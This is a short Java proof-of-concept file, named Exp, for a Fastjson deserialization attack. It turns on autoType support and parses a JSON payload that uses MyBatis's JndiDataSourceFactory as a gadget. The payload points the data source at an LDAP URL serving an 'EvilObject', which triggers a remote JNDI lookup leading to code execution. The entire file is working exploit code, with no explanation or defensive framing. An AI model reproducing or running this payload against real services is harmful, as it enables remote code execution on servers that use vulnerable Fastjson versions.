import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Exp {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," +  
                "\"properties\":{\"data_source\":\"ldap://127.0.0.1:1099/EvilObject\"}}"; 
        JSON.parse(payload);
    }
}
